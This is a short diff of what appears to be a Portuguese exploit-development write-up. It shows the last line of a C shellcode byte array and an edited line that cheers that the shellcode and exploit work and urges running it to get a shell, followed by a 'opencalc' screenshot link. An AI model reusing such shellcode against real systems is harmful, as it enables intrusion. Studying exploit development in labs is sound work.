@@ -320,6 +320,6 @@ unsigned char buf[] =
 "\x1b\x03\x48\x57\xad\x4e\x4c\x43\xab\x60\x29\x3b\xce";
 ```
 
-CODIGO OK! SHELLCODE TA OK, EXPLOIT TA OK!
+CODIGO OK! SHELLCODE OK!, EXPLOIT TA OK! EXECUTA LOGO E PEGA SHELL DE UMA VEZ!....
 
 ![opencalc](https://raw.githubusercontent.com/an4kein/t3mpPr0g3/master/images/20-opencalc.png)
